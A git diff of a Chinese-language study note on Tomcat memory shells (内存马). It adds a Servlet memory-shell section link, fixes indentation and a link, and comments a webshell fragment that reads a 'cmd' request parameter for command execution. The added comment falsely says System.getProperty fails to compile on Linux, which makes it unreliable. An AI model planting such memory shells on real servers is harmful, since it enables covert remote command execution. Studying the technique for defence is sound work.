@@ -28,6 +28,7 @@
     - [Servlet 3.0+ 提供动态注册机制](#servlet-30-提供动态注册机制)
       - [如何确认项目是否是 Servlet 3.0 以上的项目](#如何确认项目是否是-servlet-30-以上的项目)
     - [Filter 内存马](#filter-内存马)
+    - [Servlet内存马](#servlet内存马)
   - [示例 -Tomcat-ServletAPI型内存马](#示例--tomcat-servletapi型内存马)
     - [环境配置](#环境配置)
     - [编写与部署ServletAPI型内存马](#编写与部署servletapi型内存马)
@@ -402,22 +403,22 @@ Servlet、Listener、Filter 由 `javax.servlet.ServletContext` 去加载，无�
   >
   > ```java
   > public class MyServlet extends HttpServlet {
-  >     protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
-  >         // 获取ServletContext对象
-  >         ServletContext context = getServletContext();
+  >  protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
+  >      // 获取ServletContext对象
+  >      ServletContext context = getServletContext();
   > 
-  >         // 从ServletContext获取初始化参数
-  >         String dbUrl = context.getInitParameter("databaseUrl");
-  >         
-  >         // 使用ServletContext共享一些数据
-  >         context.setAttribute("appName", "My Awesome App");
-  >         
-  >         // 获取文件资源的输入流
-  >         InputStream inputStream = context.getResourceAsStream("/WEB-INF/config.properties");
-  >         
-  >         // 进行其他处理
-  >         response.getWriter().println("Database URL: " + dbUrl);
-  >     }
+  >      // 从ServletContext获取初始化参数
+  >      String dbUrl = context.getInitParameter("databaseUrl");
+  > 
+  >      // 使用ServletContext共享一些数据
+  >      context.setAttribute("appName", "My Awesome App");
+  > 
+  >      // 获取文件资源的输入流
+  >      InputStream inputStream = context.getResourceAsStream("/WEB-INF/config.properties");
+  > 
+  >      // 进行其他处理
+  >      response.getWriter().println("Database URL: " + dbUrl);
+  >  }
   > }
   > 
   > ```
@@ -449,7 +450,7 @@ Servlet、Listener、Filter 由 `javax.servlet.ServletContext` 去加载，无�
   >
   >   ```java
   >   import javax.servlet.annotation.WebServlet;
-  >                                   
+  >     
   >   @WebServlet("/myServlet")
   >   public class MyServlet extends HttpServlet {
   >       protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
@@ -912,7 +913,7 @@ Servlet 是 Server Applet（服务器端小程序）的缩写，用来读取客�
 
 测试代码在 [org.su18.memshell.web.servlet.AddTomcatServlet](https://github.com/su18/MemoryShell/blob/main/memshell-test/memshell-test-tomcat/src/org/su18/memshell/test/tomcat/AddTomcatServlet.java) 中，访问这个 servlet 会在程序中生成一个新的 Servlet :`/su18`
 
-具体示例及实现部分可以在本文同级目录下的 [Tomcat内存马/Filter内存马/servletContext-addFilter](Tomcat内存马/Filter内存马/servletContext-addFilter.md) 中查看
+具体示例及实现部分可以在本文同级目录下的 [Tomcat内存马/Servlet内存马/servletContext-addServlet](Tomcat内存马/Servlet内存马/servletContext-addServlet.md) 中查看
 
 ---
 
@@ -972,6 +973,7 @@ Tomcat 会自动部署这个应用, 可以通过 `http://localhost:8080/java-mem
         public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
             String cmd = servletRequest.getParameter("cmd");
             boolean isLinux = true;
+            // 下面这行中的 System 语句在 Linux Docker 容器中会报错, 编译都过不了，在Windows上可以正常解析
             String osTyp = System.getProperty("os.name");
             if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                 isLinux = false;
